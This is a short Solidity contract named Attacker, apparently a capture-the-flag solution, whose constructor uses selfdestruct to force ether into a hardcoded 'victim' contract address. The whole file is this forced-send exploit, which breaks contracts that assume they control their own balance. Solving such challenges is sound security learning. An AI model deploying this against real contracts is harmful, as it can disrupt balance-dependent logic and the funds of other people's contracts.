// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    // add your contract address.
    address victim = 0x48C54D89659c04078dEf4C253E108446eE248a2b;

    constructor () payable {
        require(msg.value > 0);
        selfdestruct(payable(victim));
    }
}